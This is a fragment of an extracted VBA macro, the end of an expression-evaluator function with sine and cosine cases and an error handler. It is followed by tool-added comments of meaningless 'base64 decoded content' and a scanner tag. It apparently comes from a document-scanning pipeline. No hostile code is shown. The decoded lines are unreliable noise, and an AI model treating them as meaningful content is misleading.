            dResult = Cos(dParam)
        Case "SIN"
            dResult = Sin(dParam)
        ' Put here your functions
        Case Else
            sErrorMsg = "Function not implemented"
            GoTo EvalError
        End Select
    End Select
    
    TreeEval = dResult
    Exit Function

EvalError:
    MsgBox sErrorMsg
End Function







' InQuest injected base64 decoded content
' H9TA
' Y< ;5.
' /CO4GR
' [7-(&9
' 	9TI.QE
' L17>1?
' 4GME!
' A?JA
' I5&%5*GIS
' 	MER 

INQUEST-PP=macro
